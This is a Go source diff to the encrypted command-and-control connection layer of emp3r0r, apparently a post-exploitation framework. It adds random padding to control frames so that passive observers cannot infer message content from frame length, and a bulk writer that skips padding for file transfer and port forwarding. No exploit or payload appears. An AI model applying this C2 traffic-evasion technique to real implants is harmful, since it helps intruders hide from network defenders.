@@ -4,18 +4,63 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
+	"encoding/binary"
 	"fmt"
 	"io"
 	"net"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 const DefaultC2BlockSize = 32 * 1024
+
+// c2PaddingMaxFrame bounds which frames receive random padding. Bulk stream
+// chunks (file transfer, port forwarding) above this size already have
+// unpredictable, content-independent lengths; padding them would only add
+// bandwidth overhead. Control frames are well under this limit.
+const c2PaddingMaxFrame = 32 * 1024
+
+// Padding is a sender-side knob: each frame carries its own payload length, so
+// the receiver strips padding without knowing the configured range. Atomically
+// accessed because config load sets it while connection goroutines read it.
+var (
+	c2PaddingMin atomic.Int32
+	c2PaddingMax atomic.Int32
+)
+
+// SetC2Padding sets the per-frame plaintext padding range in bytes. min<=0
+// disables padding and max<min is clamped to min.
+func SetC2Padding(min, max int) {
+	if min < 0 {
+		min = 0
+	}
+	if max < min {
+		max = min
+	}
+	c2PaddingMin.Store(int32(min))
+	c2PaddingMax.Store(int32(max))
+}
+
+func (sc *SecureConn) choosePadding(payloadLen int) int {
+	if payloadLen <= 0 || payloadLen > c2PaddingMaxFrame {
+		return 0
+	}
+	min := int(c2PaddingMin.Load())
+	max := int(c2PaddingMax.Load())
+	if min <= 0 {
+		return 0
+	}
+	if max < min {
+		max = min
+	}
+	return util.RandInt(min, max+1)
+}
 
 // SecureConn wraps a net.Conn with AES-GCM encryption
 type SecureConn struct {
@@ -47,6 +92,11 @@ func NewSecureConn(conn io.ReadWriteCloser) *SecureConn {
 	if sc, ok := conn.(*SecureConn); ok {
 		return sc
 	}
+	// A padded-bypass writer wraps the same SecureConn; unwrap it so callers
+	// never end up with two encryption layers.
+	if bc, ok := conn.(*BulkConn); ok {
+		return bc.SecureConn
+	}
 
 	// If conn is not a net.Conn, wrap it
 	var netConn net.Conn
@@ -62,6 +112,27 @@ func NewSecureConn(conn io.ReadWriteCloser) *SecureConn {
 	}
 }
 
+// BulkConn is a SecureConn whose writes skip per-frame padding. Reads are
+// unchanged. It is used for bulk byte relays (file transfer, port forwarding)
+// where the payload length is already large and content-independent.
+type BulkConn struct {
+	*SecureConn
+}
+
+// Write skips the random padding applied to control frames.
+func (b *BulkConn) Write(p []byte) (int, error) {
+	return b.SecureConn.WriteBulk(p)
+}
+
+// NewBulkWriter wraps conn so writes skip padding. If conn is not a
+// *SecureConn it is returned unchanged.
+func NewBulkWriter(conn io.ReadWriteCloser) io.ReadWriteCloser {
+	if sc, ok := conn.(*SecureConn); ok {
+		return &BulkConn{SecureConn: sc}
+	}
+	return conn
+}
+
 // SetKey updates the encryption key for the connection.
 // This is used to switch to a session key after a successful handshake.
 func (sc *SecureConn) SetKey(key []byte) {
@@ -70,83 +141,122 @@ func (sc *SecureConn) SetKey(key []byte) {
 	sc.key = key
 }
 
-// Read reads encrypted data from the connection, decrypts it, and returns it.
+// Read reads encrypted data from the connection, decrypts it, and returns the
+// payload. The plaintext frame is [payloadLen (4 bytes BE)][payload][padding];
+// the padding is stripped here so upper layers only see payload bytes.
 func (sc *SecureConn) Read(p []byte) (n int, err error) {
 	sc.readMu.Lock()
 	defer sc.readMu.Unlock()
 
-	// If we have buffered data, return it
-	if len(sc.readBuf) > 0 {
-		n = copy(p, sc.readBuf)
-		sc.readBuf = sc.readBuf[n:]
+	for {
+		// If we have buffered data, return it
+		if len(sc.readBuf) > 0 {
+			n = copy(p, sc.readBuf)
+			sc.readBuf = sc.readBuf[n:]
+			return n, nil
+		}
+
+		// Read header: 4 bytes length
+		header := make([]byte, 4)
+		_, err = io.ReadFull(sc.Conn, header)
+		if err != nil {
+			return 0, err
+		}
+
+		// Parse length
+		dataLen := int(binary.BigEndian.Uint32(header))
+
+		// Sanity check
+		if dataLen <= 0 || dataLen > 10*1024*1024 { // 10MB max chunk
+			return 0, fmt.Errorf("read: invalid encrypted chunk length: %d", dataLen)
+		}
+
+		// Read encrypted payload
+		encryptedData := make([]byte, dataLen)
+		_, err = io.ReadFull(sc.Conn, encryptedData)
+		if err != nil {
+			return 0, err
+		}
+
+		// Decrypt
+		sc.keyMu.RLock()
+		key := sc.key
+		sc.keyMu.RUnlock()
+		decrypted, err := crypto.AES_GCM_Decrypt_Raw(key, encryptedData)
+		if err != nil {
+			logging.Errorf("SecureConn: decryption failed: %v", err)
+			return 0, err
+		}
+
+		// Strip the in-frame length and any padding. The length is authenticated
+		// (it lives inside the GCM ciphertext), so a tampered value fails the tag.
+		if len(decrypted) < 4 {
+			return 0, fmt.Errorf("read: decrypted frame too short: %d", len(decrypted))
+		}
+		payloadLen := int(binary.BigEndian.Uint32(decrypted[:4]))
+		if payloadLen < 0 || payloadLen > len(decrypted)-4 {
+			return 0, fmt.Errorf("read: invalid payload length: %d (frame %d)", payloadLen, len(decrypted))
+		}
+		payload := decrypted[4 : 4+payloadLen]
+		if payloadLen == 0 {
+			// Do not surface a zero-length frame as a zero-byte Read; skip to
+			// the next frame instead so callers never see a spurious EOF-like
+			// no-progress result.
+			continue
+		}
+
+		// Copy to p
+		n = copy(p, payload)
+
+		// Buffer remaining
+		if n < len(payload) {
+			sc.readBuf = payload[n:]
+		}
+
 		return n, nil
 	}
-
-	// Read header: 4 bytes length
-	header := make([]byte, 4)
-	_, err = io.ReadFull(sc.Conn, header)
-	if err != nil {
-		return 0, err
-	}
-
-	// Parse length
-	dataLen := int(header[0])<<24 | int(header[1])<<16 | int(header[2])<<8 | int(header[3])
-
-	// Sanity check
-	if dataLen <= 0 || dataLen > 10*1024*1024 { // 10MB max chunk
-		return 0, fmt.Errorf("read: invalid encrypted chunk length: %d", dataLen)
-	}
-
-	// Read encrypted payload
-	encryptedData := make([]byte, dataLen)
-	_, err = io.ReadFull(sc.Conn, encryptedData)
-	if err != nil {
-		return 0, err
-	}
-
-	// Decrypt
-	sc.keyMu.RLock()
-	key := sc.key
-	sc.keyMu.RUnlock()
-	decrypted, err := crypto.AES_GCM_Decrypt_Raw(key, encryptedData)
-	if err != nil {
-		logging.Errorf("SecureConn: decryption failed: %v", err)
-		return 0, err
-	}
-
-	// Copy to p
-	n = copy(p, decrypted)
-
-	// Buffer remaining
-	if n < len(decrypted) {
-		sc.readBuf = decrypted[n:]
-	}
-
-	return n, nil
 }
 
-// Write encrypts the data and writes it to the connection with framing.
+// Write encrypts the data and writes it to the connection with framing. Control
+// frames carry random padding so a passive observer cannot map frame length to
+// message content; the receiver strips it via the in-frame payload length.
 func (sc *SecureConn) Write(p []byte) (n int, err error) {
+	return sc.writeFrame(p, sc.choosePadding(len(p)))
+}
+
+// WriteBulk writes a frame without random padding. Bulk byte relays use it so
+// large transfers are not inflated by per-chunk padding, while keeping the same
+// on-wire framing as Write.
+func (sc *SecureConn) WriteBulk(p []byte) (int, error) {
+	return sc.writeFrame(p, 0)
+}
+
+func (sc *SecureConn) writeFrame(p []byte, padLen int) (int, error) {
 	sc.writeMu.Lock()
 	defer sc.writeMu.Unlock()
 
 	sc.keyMu.RLock()
 	key := sc.key
 	sc.keyMu.RUnlock()
-	encrypted, err := crypto.AES_GCM_Encrypt_Raw(key, p)
+
+	// Plaintext frame: [payloadLen (4 bytes BE)][payload][random padding].
+	plain := make([]byte, 4+len(p)+padLen)
+	binary.BigEndian.PutUint32(plain[:4], uint32(len(p)))
+	copy(plain[4:], p)
+	if padLen > 0 {
+		if _, err := rand.Read(plain[4+len(p):]); err != nil {
+			return 0, fmt.Errorf("pad frame: %w", err)
+		}
+	}
+
+	encrypted, err := crypto.AES_GCM_Encrypt_Raw(key, plain)
 	if err != nil {
 		return 0, fmt.Errorf("encryption failed: %v", err)
 	}
 
 	// Frame: [Len (4 bytes)] [Encrypted Data]
-	totalLen := len(encrypted)
-	frame := make([]byte, 4+totalLen)
-
-	frame[0] = byte(totalLen >> 24)
-	frame[1] = byte(totalLen >> 16)
-	frame[2] = byte(totalLen >> 8)
-	frame[3] = byte(totalLen)
-
+	frame := make([]byte, 4+len(encrypted))
+	binary.BigEndian.PutUint32(frame[:4], uint32(len(encrypted)))
 	copy(frame[4:], encrypted)
 
 	written := 0
